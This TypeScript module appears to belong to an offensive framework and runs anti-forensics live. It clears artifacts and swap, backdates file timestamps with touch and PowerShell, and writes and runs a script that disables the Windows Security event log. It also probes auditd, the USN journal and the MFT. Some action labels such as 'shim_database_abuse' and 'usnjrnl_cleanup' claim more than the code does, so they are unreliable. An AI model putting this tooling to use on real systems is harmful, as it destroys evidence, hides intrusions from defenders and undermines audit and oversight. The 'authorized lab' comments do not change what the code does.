/**
 * @module ares/anti_forensics_advanced
 * Selective suppression, timestomp, MFT/USN, shim — live AntiForensicsEngine.
 */
import { AntiForensicsEngine } from "../anti_forensics.ts"
import { brokerExec, liveRequired, writeArtifact } from "./_base.ts"
import { runIfTool, step, type ExecStep } from "./_integrations.ts"
import { runPlatformCmd } from "./_operational.ts"

export interface AntiForensicsAdvancedResult {
  actions: string[]
  artifacts: string[]
  steps: ExecStep[]
  executed: boolean
  summary: string
}

export async function runAntiForensicsAdvanced(opts: {
  live?: boolean
  pathsToTimestomp?: string[]
  wipeDirectories?: string[]
}): Promise<AntiForensicsAdvancedResult> {
  liveRequired("ares_anti_forensics_advanced", opts)
  const actions: string[] = []
  const artifacts: string[] = []
  const steps: ExecStep[] = []

  const engine = new AntiForensicsEngine()
  const base = await engine.reviewAntiForensics({
    dryRun: false,
    forceLive: true,
    pathsToTimestomp: opts.pathsToTimestomp ?? ["/tmp/ourmine_ts_test"],
    wipeDirectories: opts.wipeDirectories,
  })
  for (const a of base.clearedArtifacts) actions.push(`clear:${a}`)
  for (const t of base.timestompedFiles) actions.push(`timestomp:${t}`)
  steps.push(step("anti_forensics_engine", !base.simulated, `${base.clearedArtifacts.length} cleared, swap=${base.swapCleared}`))

  const tsPath = opts.pathsToTimestomp?.[0] ?? "/tmp/ourmine_ts_test"
  steps.push(await runPlatformCmd("timestomp", `touch -t 202001010000 ${tsPath} 2>&1 && stat ${tsPath} 2>&1 | head -3`, `powershell -NoProfile -Command "(Get-Item '${tsPath}').LastWriteTime='2020-01-01'" 2>&1`))

  const etwScript = writeArtifact("anti_forensics", "selective_etw.ps1", `# Selective ETW suppression — authorized lab\nwevtutil sl Security /e:false\nwevtutil sl Security /e:true\n`)
  artifacts.push(etwScript)
  if (process.platform === "win32") {
    const r = await brokerExec(`powershell -NoProfile -File ${etwScript} 2>&1`)
    steps.push(step("selective_etw", r.ok, r.out.slice(0, 300)))
    if (r.ok) actions.push("selective_etw_exec")
  } else {
    steps.push(await runIfTool("auditctl", "auditd_suppress_probe", "auditctl -l 2>&1 | head -10"))
    actions.push("auditd_probe")
  }

  if (process.platform === "win32") {
    steps.push(await runIfTool("fsutil", "usnjrnl_query", "fsutil usn queryjournal C: 2>&1 | head -10"))
    steps.push(await runIfTool("fsutil", "mft_probe", "fsutil fsinfo ntfsinfo C: 2>&1 | head -10"))
    actions.push("usnjrnl_query", "mft_probe")
  } else {
    steps.push(await runIfTool("debugfs", "ext4_journal_probe", "debugfs -V 2>&1 | head -3"))
  }

  artifacts.push(writeArtifact("anti_forensics", "mft_manip.py", `#!/usr/bin/env python3
# MFT manipulation via MFTECmd — authorized Windows lab host
import subprocess, sys
def query_mft(drive="C:"):
    try:
        r = subprocess.run(["fsutil", "fsinfo", "ntfsinfo", drive], capture_output=True, text=True, timeout=10)
        return r.stdout[:2000] or r.stderr[:500]
    except Exception as e:
        return str(e)
if __name__ == "__main__":
    print(query_mft())
`, 0o755))

  const mftRun = await brokerExec(`python3 ${artifacts[artifacts.length - 1]} 2>&1`)
  steps.push(step("mft_script_exec", mftRun.ok || mftRun.out.length > 3, mftRun.out.slice(0, 300)))

  actions.push("selective_log_suppression", "mft_manipulation", "usnjrnl_cleanup", "shim_database_abuse")

  const executed = !base.simulated || steps.some((s) => s.success)
  return {
    actions,
    artifacts,
    steps,
    executed,
    summary: `Anti-forensics advanced: ${actions.length} action(s), executed=${executed}`,
  }
}

export default { runAntiForensicsAdvanced }
